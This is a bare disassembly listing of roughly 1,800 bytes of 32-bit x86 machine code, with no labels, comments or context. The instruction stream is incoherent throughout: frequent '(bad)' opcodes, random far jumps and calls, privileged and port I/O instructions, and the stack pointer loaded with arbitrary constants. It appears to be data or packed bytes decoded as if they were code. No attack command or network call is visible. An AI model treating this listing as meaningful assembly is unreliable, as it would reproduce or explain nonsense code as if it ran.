  41ab7f:	cmp    eax,0xaa46cba1
  41ab84:	pop    eax
  41ab85:	jmp    0xa2d83143
  41ab8a:	jmp    0x837e:0xcd06798a
  41ab91:	fldenv [eax+0x4d]
  41ab94:	xor    BYTE PTR [ebp-0x24],0x61
  41ab98:	loopne 0x41abd4
  41ab9a:	push   edx
  41ab9b:	mov    esp,0x2f7ee51f
  41aba0:	sbb    DWORD PTR [ecx],ecx
  41aba2:	xlat   BYTE PTR ds:[ebx]
  41aba3:	jle    0x41abce
  41aba5:	push   eax
  41aba6:	xor    cl,0xf
  41aba9:	call   0x55eb:0x9eeb7052
  41abb0:	add    ch,ch
  41abb2:	arpl   WORD PTR [edx+0x6],si
  41abb5:	test   DWORD PTR [edx],ecx
  41abb7:	mov    ds:0xba5f1b7,eax
  41abbc:	and    dh,0xdf
  41abbf:	enter  0x910b,0xa1
  41abc3:	stos   DWORD PTR es:[edi],eax
  41abc4:	mov    ds:0xeebcb550,al
  41abc9:	int    0x3a
  41abcb:	ins    BYTE PTR es:[edi],dx
  41abcc:	add    BYTE PTR [eax],cl
  41abce:	sub    BYTE PTR [edx+0x37],ah
  41abd1:	inc    ecx
  41abd2:	popf   
  41abd3:	int3   
  41abd4:	jecxz  0x41abe9
  41abd6:	mov    ah,bl
  41abd8:	jb     0x41ab71
  41abda:	(bad)  
  41abdb:	jae    0x41ab8b
  41abdd:	cdq    
  41abde:	add    eax,0x3d68f9ba
  41abe3:	popa   
  41abe4:	imul   ecx,DWORD PTR [edi+0x2560c6e7],0xffffffd7
  41abeb:	pop    edx
  41abec:	push   edx
  41abed:	in     al,0x88
  41abef:	mov    ecx,0xd8c491bc
  41abf4:	jecxz  0x41ac6c
  41abf6:	pop    edi
  41abf7:	add    esp,DWORD PTR [ecx+0x69b19678]
  41abfd:	repz hlt 
  41abff:	mov    esp,DWORD PTR [edi-0x450c2453]
  41ac05:	(bad)  
  41ac06:	jl     0x41abf2
  41ac08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac09:	retf   
  41ac0a:	jecxz  0x41ac71
  41ac0c:	push   ss
  41ac0d:	cdq    
  41ac0e:	mov    bl,BYTE PTR [esi]
  41ac10:	sbb    DWORD PTR [esi+eax*8-0x52],edx
  41ac14:	sub    BYTE PTR [ebp+ebp*4+0x4311a646],bl
  41ac1b:	xor    ebx,ebp
  41ac1d:	stos   BYTE PTR es:[edi],al
  41ac1e:	or     BYTE PTR [ebx-0x73e95606],0x21
  41ac25:	sub    BYTE PTR [edi],0xae
  41ac28:	in     eax,dx
  41ac29:	je     0x41ac69
  41ac2b:	cmovns ebp,DWORD PTR [ebp+0x625b7c3a]
  41ac32:	and    DWORD PTR [edi+0x6],ebx
  41ac35:	dec    edx
  41ac36:	in     eax,dx
  41ac37:	sub    eax,0x4026a92
  41ac3c:	(bad)  
  41ac3e:	fwait
  41ac3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac40:	clc    
  41ac41:	pop    ebx
  41ac42:	xor    eax,0x84bfb13b
  41ac47:	pop    es
  41ac48:	dec    ch
  41ac4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac4b:	mov    eax,0xa6b5bbd6
  41ac50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac51:	and    al,0xe7
  41ac53:	xor    DWORD PTR [ecx-0x7e1ef3ff],ecx
  41ac59:	inc    esi
  41ac5a:	sbb    DWORD PTR [edi+edx*1+0xe],ecx
  41ac5e:	addr16 in al,dx
  41ac60:	std    
  41ac61:	cdq    
  41ac62:	inc    esi
  41ac63:	fisubr WORD PTR [edx+0x2f77c2d0]
  41ac69:	imul   bx,WORD PTR [ebx-0x6a],0x12
  41ac6e:	mov    ah,bh
  41ac70:	jb     0x41ac72
  41ac72:	imul   ebx,DWORD PTR [edx+0x74],0x8d2e290d
  41ac79:	loope  0x41ac82
  41ac7b:	push   esi
  41ac7c:	jg     0x41ace1
  41ac7e:	outs   dx,DWORD PTR ds:[esi]
  41ac7f:	out    dx,eax
  41ac80:	and    DWORD PTR [edx+0x1f],esi
  41ac83:	mul    cl
  41ac85:	cmp    eax,0x21bcc951
  41ac8a:	bound  esp,QWORD PTR [eax+ebp*1]
  41ac8d:	imul   esp,ebx,0x859e5f86
  41ac93:	(bad)  
  41ac94:	mov    edx,0x4eccf92b
  41ac99:	adc    al,0x40
  41ac9b:	pushf  
  41ac9c:	(bad)  [esi+0x1fad63a6]
  41aca2:	shld   DWORD PTR [esi+0x20],esi,cl
  41aca6:	test   eax,0xb0d2fa8f
  41acab:	sub    BYTE PTR [esi+ecx*8+0x699250f6],ah
  41acb2:	mov    ah,0xe3
  41acb4:	sbb    cl,dh
  41acb6:	xor    al,0x57
  41acb8:	aas    
  41acb9:	dec    ebx
  41acba:	dec    esi
  41acbb:	push   eax
  41acbc:	mov    edx,fs
  41acbe:	add    DWORD PTR [ecx],esp
  41acc0:	cmp    eax,0xfcf82951
  41acc5:	shl    edx,1
  41acc7:	cmp    ch,cl
  41acc9:	add    edi,DWORD PTR [edi+0xd]
  41accc:	cs sahf 
  41acce:	adc    esp,DWORD PTR ds:0x6e05e093
  41acd4:	sbb    bh,BYTE PTR ds:0xf5301fce
  41acda:	adc    al,0x7a
  41acdc:	jb     0x41ad39
  41acde:	jge    0x41ad4b
  41ace0:	cmp    eax,DWORD PTR [ebp+0x4]
  41ace3:	hlt    
  41ace4:	push   0x17
  41ace6:	push   cs
  41ace7:	mov    BYTE PTR [ecx+esi*2-0xc94094d],dl
  41acee:	(bad)  
  41acf0:	jmp    0x409dab8f
  41acf5:	jne    0x41acf6
  41acf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acf8:	test   eax,0x62296a73
  41acfd:	idiv   BYTE PTR [edx-0x62]
  41ad00:	xor    eax,0x6edd2398
  41ad05:	js     0x41ad35
  41ad07:	xor    al,0xfe
  41ad09:	lahf   
  41ad0a:	xor    ah,dl
  41ad0c:	jle    0x41acfc
  41ad0e:	push   ss
  41ad0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad10:	loopne 0x41ace7
  41ad12:	retf   
  41ad13:	ins    DWORD PTR es:[edi],dx
  41ad14:	stos   BYTE PTR es:[edi],al
  41ad15:	pusha  
  41ad16:	jns    0x41ac9e
  41ad18:	jmp    0x2c31b438
  41ad1d:	inc    BYTE PTR [ebx-0x7235f6ad]
  41ad23:	push   esi
  41ad24:	loopne 0x41ad58
  41ad26:	jp     0x41aced
  41ad28:	adc    al,0xcb
  41ad2a:	dec    ebp
  41ad2b:	pop    esi
  41ad2c:	and    BYTE PTR [ecx+0x46074bd],ch
  41ad32:	ret    0x1d8e
  41ad35:	retf   0xebc5
  41ad38:	sbb    BYTE PTR [esi+edx*8+0x61af2a74],0x8e
  41ad40:	not    DWORD PTR [edx+0x6c]
  41ad43:	jecxz  0x41ace9
  41ad45:	xchg   esp,eax
  41ad46:	jmp    0xc1e2826c
  41ad4b:	cli    
  41ad4c:	push   ebx
  41ad4d:	ins    DWORD PTR es:[edi],dx
  41ad4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad4f:	imul   edi,DWORD PTR [esi-0x2c89086f],0x27
  41ad56:	imul   ebp,DWORD PTR [edx-0x4a54ac4b],0xa7a6c7c9
  41ad60:	shr    BYTE PTR [eax-0x7ebce227],0x50
  41ad67:	inc    eax
  41ad68:	dec    ebx
  41ad69:	sbb    DWORD PTR [esi-0x330d9c74],ebx
  41ad6f:	loop   0x41add6
  41ad71:	mov    dl,0xbf
  41ad73:	xlat   BYTE PTR ds:[ebx]
  41ad74:	or     bh,BYTE PTR [ebx+esi*2+0x4f5feaa9]
  41ad7b:	data16 in al,dx
  41ad7d:	in     al,0xe3
  41ad7f:	cld    
  41ad80:	add    al,0xe5
  41ad82:	cmp    ecx,eax
  41ad84:	xchg   esi,eax
  41ad85:	adc    BYTE PTR [eax-0xb38e6e8],ch
  41ad8b:	inc    edi
  41ad8c:	jo     0x41ad32
  41ad8e:	and    BYTE PTR [ecx],ah
  41ad90:	out    0x28,al
  41ad92:	dec    ebp
  41ad93:	xor    esp,ebp
  41ad95:	fs pop eax
  41ad97:	daa    
  41ad98:	sbb    BYTE PTR [esi],al
  41ad9a:	out    dx,eax
  41ad9b:	aam    0x50
  41ad9d:	and    ebp,edi
  41ad9f:	out    dx,al
  41ada0:	jno    0x41ae02
  41ada2:	push   edi
  41ada3:	sti    
  41ada4:	loopne 0x41ada8
  41ada6:	dec    ebp
  41ada7:	rol    BYTE PTR [ebp-0x60a4d1c9],0x8e
  41adae:	cmp    eax,0x16dd08c4
  41adb3:	xor    cl,BYTE PTR [ecx]
  41adb5:	and    DWORD PTR [esi+0x142d0097],edx
  41adbb:	pop    ds
  41adbc:	dec    BYTE PTR [edx+esi*2-0xd205b93]
  41adc3:	imul   ebx,edi,0xfffffff1
  41adc6:	add    DWORD PTR [ecx-0x55],0xe
  41adca:	adc    al,0x5c
  41adcc:	mov    al,0x7c
  41adce:	hlt    
  41adcf:	fstp   st(2)
  41add1:	xor    bh,BYTE PTR [ecx+0x6a4ca954]
  41add7:	out    dx,eax
  41add8:	out    0x9e,al
  41adda:	sbb    ch,0x93
  41addd:	push   cs
  41adde:	adc    eax,0xf5b83cb5
  41ade3:	and    al,0x5f
  41ade5:	arpl   WORD PTR [edx+0x700040cc],di
  41adeb:	in     al,0xa9
  41aded:	sbb    DWORD PTR [ecx+0x2f2fba8f],eax
  41adf3:	mov    eax,DWORD PTR [esi-0x7f]
  41adf6:	cmc    
  41adf7:	mov    ah,0x78
  41adf9:	push   esp
  41adfa:	dec    esi
  41adfb:	jge    0x41ad85
  41adfd:	mov    esi,0xb908e9d8
  41ae02:	or     BYTE PTR [ebp+ecx*8-0x2f],0x4c
  41ae07:	pop    es
  41ae08:	rol    BYTE PTR [ecx+esi*8-0x2e],0x73
  41ae0d:	push   eax
  41ae0e:	or     eax,DWORD PTR [edx]
  41ae10:	gs mov esp,0x2c9c095a
  41ae16:	jnp    0x41ae43
  41ae18:	mov    esp,0xcfeb7a63
  41ae1d:	(bad)  
  41ae1e:	mov    ebx,0x2d5a35dc
  41ae23:	adc    ebp,esp
  41ae25:	icebp  
  41ae26:	cli    
  41ae27:	imul   ecx,esi,0x8903534d
  41ae2d:	mov    bh,0xfd
  41ae2f:	jle    0x41ae93
  41ae31:	mov    edi,edx
  41ae33:	(bad)  [esi]
  41ae35:	dec    esp
  41ae36:	(bad)  
  41ae37:	repnz enter 0x55f7,0xb5
  41ae3c:	jmp    0x41ae56
  41ae3e:	fldz   
  41ae40:	ins    DWORD PTR es:[edi],dx
  41ae41:	adc    BYTE PTR [ebp-0x62f6d90],al
  41ae47:	gs stos BYTE PTR es:[edi],al
  41ae49:	mov    ebx,es
  41ae4b:	lock rep ins DWORD PTR es:[edi],dx
  41ae4e:	lods   al,BYTE PTR ds:[esi]
  41ae4f:	test   DWORD PTR ss:[edx],ebx
  41ae52:	shl    BYTE PTR [edx-0x5c],1
  41ae55:	idiv   BYTE PTR [eax]
  41ae57:	and    cl,BYTE PTR [eax-0x2767481f]
  41ae5d:	ret    0xef2a
  41ae60:	mov    ebp,0xdf591806
  41ae65:	bound  edx,QWORD PTR [eax]
  41ae67:	xchg   DWORD PTR [eax-0x79],edx
  41ae6a:	pop    edi
  41ae6b:	adc    DWORD PTR ds:0xedb50481,esp
  41ae71:	fld    TBYTE PTR [edi-0x1caa042]
  41ae77:	in     al,0xb6
  41ae79:	mov    WORD PTR ds:[eax-0x24af6360],ss
  41ae80:	or     al,0x8d
  41ae82:	xchg   DWORD PTR [ecx+eiz*8+0x2d],ecx
  41ae86:	mov    ecx,0x5fdb1694
  41ae8b:	or     edi,ebp
  41ae8d:	fst    DWORD PTR [ebx-0x37be32fe]
  41ae93:	jmp    0x279c:0x33580a97
  41ae9a:	sar    BYTE PTR [edx-0xe],1
  41ae9d:	push   cs
  41ae9e:	js     0x41af0c
  41aea0:	pop    ss
  41aea1:	nop
  41aea2:	inc    ecx
  41aea3:	fdiv   QWORD PTR [ecx]
  41aea5:	adc    esi,DWORD PTR [ebx]
  41aea7:	push   eax
  41aea8:	sbb    bl,bh
  41aeaa:	pop    ecx
  41aeab:	xchg   esi,eax
  41aeac:	jb     0x41ae93
  41aeae:	stc    
  41aeaf:	cld    
  41aeb0:	and    eax,0x8809e577
  41aeb5:	push   esp
  41aeb6:	mov    esi,DWORD PTR [ecx]
  41aeb8:	mov    esi,DWORD PTR [eax+eax*2]
  41aebb:	jnp    0x41ae61
  41aebd:	test   eax,0xd2679fa3
  41aec2:	mov    esp,0xf240ceb8
  41aec7:	jno    0x41ae61
  41aec9:	call   0xe982:0xae5d4409
  41aed0:	lods   eax,DWORD PTR ds:[esi]
  41aed1:	pusha  
  41aed2:	push   0x9f99cf58
  41aed7:	rcl    DWORD PTR [ecx+esi*1],cl
  41aeda:	mov    ebp,0xd8e4229c
  41aedf:	dec    eax
  41aee0:	imul   ebp,esi,0xfffffffd
  41aee3:	push   0x31
  41aee5:	call   0x4dc6:0xfebb4773
  41aeec:	push   edi
  41aeed:	ret    
  41aeee:	add    DWORD PTR [esp+ebp*2],edi
  41aef1:	xchg   esp,eax
  41aef3:	or     al,0x11
  41aef5:	fidivr DWORD PTR [eax+0x325ba7d9]
  41aefb:	shr    DWORD PTR [edx],1
  41aefd:	sub    DWORD PTR [edi-0x11],ebp
  41af00:	push   eax
  41af01:	push   ebx
  41af02:	xchg   esp,eax
  41af03:	and    BYTE PTR [ecx],bh
  41af05:	lods   al,BYTE PTR ds:[esi]
  41af06:	jbe    0x41af67
  41af08:	xchg   edx,eax
  41af09:	daa    
  41af0a:	jle    0x41af0a
  41af0c:	ds xchg esp,eax
  41af0e:	lock adc BYTE PTR [ebx+0x22],al
  41af12:	push   eax
  41af13:	xor    esi,DWORD PTR [ecx+eax*2+0x48fef7a9]
  41af1a:	sub    ah,BYTE PTR [ebp+0x4f]
  41af1d:	outs   dx,BYTE PTR ds:[esi]
  41af1e:	loopne 0x41af52
  41af20:	out    dx,al
  41af21:	imul   ebp,DWORD PTR [ebp+0x4c],0x2f899a45
  41af28:	inc    esi
  41af29:	iret   
  41af2a:	fwait
  41af2b:	or     eax,0xce857591
  41af30:	push   ebx
  41af31:	xchg   ecx,eax
  41af32:	adc    BYTE PTR [eax],dh
  41af34:	scas   al,BYTE PTR es:[edi]
  41af35:	scas   eax,DWORD PTR es:[edi]
  41af36:	or     edx,DWORD PTR [eax]
  41af38:	fidiv  WORD PTR [ebp+0x52426b8e]
  41af3e:	lods   eax,DWORD PTR ds:[esi]
  41af3f:	loopne 0x41af27
  41af41:	mov    dh,0x58
  41af43:	cmp    BYTE PTR [ecx],ah
  41af45:	xor    ebp,edx
  41af47:	adc    ebp,eax
  41af49:	(bad)  
  41af4a:	sub    edi,edi
  41af4c:	shl    BYTE PTR [esi],1
  41af4e:	inc    ecx
  41af4f:	sub    edi,DWORD PTR [ebx-0x63a747b9]
  41af55:	push   0x5bc6aece
  41af5a:	or     BYTE PTR ds:0x18563bc9,ah
  41af60:	leave  
  41af61:	loopne 0x41af2b
  41af63:	add    al,BYTE PTR [ecx+0x5d19efbc]
  41af69:	mov    bh,0x56
  41af6b:	mov    eax,0x10a72a8b
  41af70:	ret    
  41af71:	pop    ecx
  41af72:	in     eax,0x53
  41af74:	ss mov cl,0xb5
  41af77:	xor    BYTE PTR [edx],bh
  41af79:	push   es
  41af7a:	test   DWORD PTR [esp+eax*2+0x41],0xfa8611c
  41af82:	cli    
  41af83:	mov    ecx,0x7d441829
  41af88:	mov    WORD PTR [esi+ebp*8],gs
  41af8b:	inc    ebp
  41af8c:	mov    ecx,0x15dc3f66
  41af91:	pop    ecx
  41af92:	mov    WORD PTR [ebx+0x1f3e7117],fs
  41af98:	rcr    DWORD PTR [eax+0x27],0xd2
  41af9c:	pop    ds
  41af9d:	xor    bl,bh
  41af9f:	retf   0x60a8
  41afa2:	inc    eax
  41afa3:	cmp    eax,0x3b25354
  41afa8:	cmp    ecx,DWORD PTR [ebx]
  41afaa:	imul   ebx,DWORD PTR [esi+0x79],0x40
  41afae:	stos   DWORD PTR es:[edi],eax
  41afaf:	sub    ecx,ebx
  41afb1:	and    BYTE PTR [ebp+0x480585b0],bl
  41afb7:	imul   esi,DWORD PTR [ecx+0x46],0xdfac166c
  41afbe:	xor    edx,DWORD PTR [ebx-0x7d5bf2a9]
  41afc4:	pop    ebx
  41afc5:	rol    BYTE PTR [ebx-0x2ff50ae9],1
  41afcb:	int3   
  41afcc:	imul   eax,DWORD PTR [ecx+0x50ae91ed],0x41
  41afd3:	lods   eax,DWORD PTR ds:[esi]
  41afd4:	add    eax,0x6d1210fd
  41afd9:	cli    
  41afda:	and    eax,0x24d6824f
  41afdf:	fs pop eax
  41afe1:	fwait
  41afe2:	in     al,dx
  41afe3:	js     0x41afe3
  41afe5:	push   0xffffff99
  41afe7:	les    ebx,FWORD PTR [esi]
  41afe9:	xchg   ecx,eax
  41afea:	push   eax
  41afeb:	xchg   ecx,eax
  41afec:	mov    ah,0x3b
  41afee:	xchg   esi,eax
  41afef:	mov    ds:0x5110b87f,al
  41aff4:	lahf   
  41aff5:	loopne 0x41afe5
  41aff7:	retf   
  41aff8:	lods   eax,DWORD PTR ds:[esi]
  41aff9:	mov    ch,0x10
  41affb:	test   DWORD PTR [ebp+0x45c3b3b],edx
  41b001:	clc    
  41b002:	inc    esp
  41b003:	sub    BYTE PTR ds:0x5b3eaff1,bh
  41b009:	mov    ecx,0x989dfc75
  41b00e:	sub    eax,0xaf818363
  41b013:	addr16 and eax,0xa04d93ce
  41b019:	push   0x75dcbb08
  41b01e:	pop    edx
  41b01f:	sahf   
  41b020:	jmp    FWORD PTR [ebx]
  41b022:	int    0xfa
  41b024:	xlat   BYTE PTR ds:[ebx]
  41b025:	retf   0x5b46
  41b028:	test   eax,0xbca20fcf
  41b02d:	pop    esi
  41b02e:	ins    DWORD PTR es:[edi],dx
  41b02f:	int    0x8d
  41b031:	inc    ebx
  41b032:	push   es
  41b033:	pop    es
  41b034:	mov    esi,0x65d49e6f
  41b039:	mov    ah,0x20
  41b03b:	es push ss
  41b03d:	inc    esp
  41b03e:	(bad)  
  41b03f:	sub    al,cl
  41b041:	push   ss
  41b042:	ror    eax,cl
  41b044:	inc    esi
  41b045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b046:	hlt    
  41b047:	(bad)
  41b04b:	mov    BYTE PTR [ebp-0x28],dh
  41b04e:	loop   0x41b074
  41b050:	fisub  DWORD PTR [ebx]
  41b052:	sbb    DWORD PTR [eax-0xccda864],esi
  41b058:	repz lahf 
  41b05a:	pop    esi
  41b05b:	pop    ds
  41b05c:	into   
  41b05d:	xor    DWORD PTR [edx+ebp*8+0x44],esi
  41b061:	pop    esi
  41b062:	jmp    0x41b0b5
  41b064:	pop    ebx
  41b065:	sbb    BYTE PTR [edx+0x3d],ch
  41b068:	imul   edx,DWORD PTR [esi+0x551e12d7],0x75ccda12
  41b072:	int    0xf5
  41b074:	cld    
  41b075:	xchg   ebx,eax
  41b076:	sub    edx,ebx
  41b078:	arpl   WORD PTR [eax+0x62c01af6],bx
  41b07e:	cmp    al,0x6c
  41b080:	(bad)
  41b084:	jb     0x41b0f7
  41b086:	scas   eax,DWORD PTR es:[edi]
  41b087:	mov    esi,0x59ea768
  41b08c:	push   ss
  41b08d:	not    dl
  41b08f:	dec    edx
  41b090:	push   ecx
  41b091:	jne    0x41b04c
  41b093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b094:	sub    eax,0x15848079
  41b099:	xchg   DWORD PTR [ecx+0x5bc53927],ecx
  41b09f:	inc    ebx
  41b0a0:	in     al,0x6c
  41b0a2:	int    0x25
  41b0a4:	stc    
  41b0a5:	pop    ebp
  41b0a6:	add    dl,cl
  41b0a8:	xchg   edi,eax
  41b0a9:	mov    bh,0xd7
  41b0ab:	push   ds
  41b0ac:	shr    DWORD PTR [ebp+ebp*8-0x38f59524],cl
  41b0b3:	ret    
  41b0b4:	fild   DWORD PTR [ecx]
  41b0b6:	sub    eax,0x5aebaa0
  41b0bb:	clc    
  41b0bc:	mov    bh,0xa7
  41b0be:	pop    esp
  41b0bf:	into   
  41b0c0:	mov    ah,0x8a
  41b0c2:	ss mov eax,0x38e58453
  41b0c8:	retf   0x5ad7
  41b0cb:	and    ebx,DWORD PTR [edi+0x167dbfb4]
  41b0d1:	shr    DWORD PTR [ebp+0x2298512a],0xe1
  41b0d8:	dec    ecx
  41b0d9:	dec    edx
  41b0da:	mov    bh,0x23
  41b0dc:	hlt    
  41b0dd:	mov    BYTE PTR [eax+edx*4+0x24],al
  41b0e1:	sub    BYTE PTR [esi+0x233a24fb],0x3c
  41b0e8:	in     eax,dx
  41b0e9:	mov    ebx,0x126438b4
  41b0ee:	icebp  
  41b0ef:	cs js  0x41b0ca
  41b0f2:	jno    0x41b0d5
  41b0f4:	push   ss
  41b0f5:	fdivr  DWORD PTR [edx]
  41b0f7:	jnp    0x41b0e3
  41b0f9:	mov    bl,0xfa
  41b0fb:	cmp    eax,eax
  41b0fd:	rcl    BYTE PTR [edi-0x705f93f9],1
  41b103:	xchg   esi,eax
  41b104:	pushf  
  41b105:	push   edx
  41b106:	jmp    0x41b125
  41b108:	aam    0xaf
  41b10a:	mov    dh,0x8
  41b10c:	ds daa 
  41b10e:	add    edi,edi
  41b110:	push   0xffffffce
  41b112:	dec    ebx
  41b113:	mov    eax,ds:0x9108bad6
  41b118:	mov    dh,0x49
  41b11a:	pop    ds
  41b11b:	ret    
  41b11c:	outs   dx,BYTE PTR ds:[esi]
  41b11d:	shl    DWORD PTR [ebp+ebp*1+0x4d96fc60],0x1c
  41b125:	mov    dl,0x22
  41b127:	push   edx
  41b128:	int    0x43
  41b12a:	push   edi
  41b12b:	test   BYTE PTR [ebx],cl
  41b12d:	shl    DWORD PTR [ebp+0x73],1
  41b130:	enter  0xf18e,0xb4
  41b134:	adc    BYTE PTR [edx],dh
  41b136:	out    dx,eax
  41b137:	push   es
  41b138:	mov    ebx,0xeee6993f
  41b13d:	int3   
  41b13e:	adc    eax,0xd0661621
  41b143:	cmp    dh,BYTE PTR [ebp-0x39887270]
  41b149:	add    BYTE PTR [edx],ah
  41b14b:	call   0xfab42d53
  41b150:	push   eax
  41b151:	push   eax
  41b152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b153:	popf   
  41b154:	fs and ch,0x3d
  41b158:	je     0x41b1cb
  41b15a:	jno    0x41b0f2
  41b15c:	inc    eax
  41b15d:	mov    al,ds:0xed0a8e06
  41b162:	sub    bh,BYTE PTR [edi+0x20]
  41b165:	cdq    
  41b166:	dec    edi
  41b167:	stos   DWORD PTR es:[edi],eax
  41b168:	(bad)  
  41b169:	and    BYTE PTR [ebx+0x4991bc76],dh
  41b16f:	nop
  41b170:	mov    eax,0x9405cb82
  41b176:	(bad)  
  41b177:	or     eax,0x6b002e8
  41b17c:	out    dx,eax
  41b17d:	mov    al,0xa1
  41b17f:	sub    DWORD PTR [ecx-0x1276e5bb],ecx
  41b185:	adc    ebx,0x67
  41b188:	(bad)  
  41b189:	imul   edi,DWORD PTR [ebp+ecx*1+0x5f99d262],0xffffffd1
  41b191:	mov    eax,ds:0xa038383
  41b196:	sahf   
  41b197:	xor    eax,0xbe973205
  41b19c:	mov    ecx,0xe0e2d199
  41b1a1:	ja     0x41b1ae
  41b1a3:	pop    esi
  41b1a4:	popf   
  41b1a5:	pop    esp
  41b1a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a7:	cmp    al,0xcb
  41b1a9:	pop    ebx
  41b1aa:	sub    eax,0x15951a96
  41b1af:	mov    dh,0xee
  41b1b1:	arpl   si,dx
  41b1b3:	adc    DWORD PTR [edx],ebx
  41b1b5:	sbb    dl,BYTE PTR [ebx+0x2973f4bd]
  41b1bb:	jl     0x41b233
  41b1bd:	or     bl,BYTE PTR [ebx]
  41b1bf:	popa   
  41b1c0:	hlt    
  41b1c1:	popa   
  41b1c2:	test   DWORD PTR [edi-0x78],ebx
  41b1c5:	rol    DWORD PTR [ebx+0x4],cl
  41b1c8:	sahf   
  41b1c9:	xor    bh,BYTE PTR [edi]
  41b1cb:	pusha  
  41b1cc:	push   0x46d72f20
  41b1d1:	sub    edx,DWORD PTR [ebp-0x26]
  41b1d4:	mov    ah,0x26
  41b1d6:	cwde   
  41b1d7:	outs   dx,BYTE PTR ds:[esi]
  41b1d8:	arpl   WORD PTR [esi+0x5f],dx
  41b1db:	ss xchg edi,ebp
  41b1de:	xchg   ebp,eax
  41b1df:	mov    cl,dh
  41b1e1:	call   0xa9c13219
  41b1e6:	xchg   esi,eax
  41b1e7:	inc    edi
  41b1e8:	mov    BYTE PTR [edx],0x3e
  41b1eb:	add    BYTE PTR [ebx-0x1b9de494],cl
  41b1f1:	cmp    DWORD PTR [ebx+0x12],ebx
  41b1f4:	es mov esi,0x2ab16137
  41b1fa:	xchg   ecx,eax
  41b1fb:	bswap  ebx
  41b1fd:	sbb    BYTE PTR [ebp+edi*8+0x1b],al
  41b201:	dec    ebp
  41b202:	or     al,0xe2
  41b204:	aam    0x2f
  41b206:	sbb    al,0x3a
  41b208:	pop    ecx
  41b209:	cld    
  41b20a:	or     al,0xd6
  41b20c:	fidivr DWORD PTR [ecx-0x7f]
  41b20f:	retf   0xa462
  41b212:	jae    0x41b201
  41b214:	cs call 0x7690:0x3ae32453
  41b21c:	shr    dh,1
  41b21e:	call   0xaf07bbfd
  41b223:	sub    eax,0xc05720ed
  41b228:	and    ebp,ecx
  41b22a:	dec    ecx
  41b22b:	push   ebp
  41b22c:	in     eax,0x7a
  41b22e:	cmp    al,0x1d
  41b230:	adc    dx,WORD PTR [edi-0x26d1cf14]
  41b237:	popa   
  41b238:	mov    cl,0x98
  41b23a:	sbb    eax,0x1cae4cb4
  41b23f:	lahf   
  41b240:	xchg   ebp,eax
  41b241:	sar    DWORD PTR [ecx+0x3c],cl
  41b244:	pop    ds
  41b245:	outs   dx,BYTE PTR ds:[esi]
  41b246:	jg     0x41b1f4
  41b248:	jmp    0xe7a88c72
  41b24d:	mov    DWORD PTR [edi],ebp
  41b24f:	dec    ebx
  41b250:	lods   eax,DWORD PTR ds:[esi]
  41b251:	jle    0x41b20b
  41b253:	push   0x8195d925
  41b258:	add    al,0x74
  41b25a:	imul   eax,ebx,0x7e1febc9
  41b260:	mov    edi,0x9303e6b1
  41b265:	jecxz  0x41b286
  41b267:	dec    edi
  41b268:	pop    esi
  41b269:	pop    ecx
  41b26a:	fs fcmovne st,st(5)
  41b26d:	sbb    ah,dh
  41b26f:	cmc    
  41b270:	xchg   esi,eax
  41b271:	push   ecx
  41b272:	inc    edx
  41b273:	push   cs
  41b274:	cmp    bl,dh
  41b276:	jno    0x41b268
  41b278:	aam    0x7a
  41b27a:	mov    esp,0xf1c851b6
  41b27f:	pop    ds
  41b280:	inc    ebp
  41b281:	mov    ds:0xd08025c,al
  41b286:	xor    esi,esp
  41b288:	xor    al,0x52
  41b28a:	lock sbb BYTE PTR [edx+0x6a],al
  41b28e:	aad    0x81
  41b290:	xor    ebx,0x45
  41b293:	popa   
  41b294:	les    ecx,FWORD PTR [eax+0x12]
  41b297:	sub    al,0xad
  41b299:	or     BYTE PTR [ebp+0x6529418b],cl
  41b29f:	dec    eax
  41b2a0:	and    eax,0xcaa8c02b
  41b2a5:	mov    edi,0x9350cfcc
  41b2aa:	mov    ds:0x21e6ebfd,eax
  41b2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2b0:	mov    ds:0xfdb58c2a,eax
  41b2b5:	jge    0x41b2aa
  41b2b7:	aam    0x6
  41b2b9:	mov    ds:0xaf729a1d,al
  41b2be:	das    
  41b2bf:	pop    ebp
  41b2c0:	mov    ?,WORD PTR [eax-0x65]
  41b2c3:	xchg   edi,eax
  41b2c4:	repz shl BYTE PTR [ecx-0x5f],1
  41b2c8:	(bad)  [edx-0x652f8f2d]
  41b2ce:	test   BYTE PTR [ebx+edx*8],ah
  41b2d1:	sahf   
  41b2d2:	xchg   edx,eax
  41b2d3:	ds push esi
  41b2d5:	xchg   ch,cl
  41b2d7:	mul    BYTE PTR [esi]
  41b2d9:	dec    ebp
  41b2da:	dec    ebx
  41b2db:	xor    esi,DWORD PTR [ebp+eiz*1+0x30afef60]
  41b2e2:	xor    ebx,DWORD PTR [ecx-0x14]
  41b2e5:	xor    ebx,DWORD PTR [edx+0x16]
  41b2e8:	xchg   edi,eax
  41b2e9:	dec    edi
  41b2ea:	loop   0x41b277
  41b2ec:	dec    eax
  41b2ed:	pop    ebp
  41b2ee:	nop
  41b2ef:	jmp    0x15bffabd
  41b2f4:	mov    dl,0x45
  41b2f6:	ret    
  41b2f7:	dec    esp
  41b2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2f9:	jle    0x41b27f
  41b2fb:	cmp    eax,0xdaf20f0c
  41b300:	jns    0x41b2bf
  41b302:	jnp    0x41b30b
  41b304:	mov    eax,?
  41b306:	jbe    0x41b37f
  41b308:	inc    eax
  41b309:	ror    BYTE PTR [ebp+0x6102e011],0xdc
  41b310:	mov    ds:0xd15e6944,al
  41b315:	add    ebx,DWORD PTR [edi+edx*1]
  41b318:	popa   
  41b319:	mov    al,ds:0x24f214e0
  41b31e:	mov    ds:0x783b5ef7,al
  41b323:	lds    esi,FWORD PTR [ebp-0x2a]
  41b326:	fmul   DWORD PTR [edx]
  41b328:	rcr    al,0x38
  41b32b:	ret    0xca2c
  41b32e:	jmp    0x41b2dd
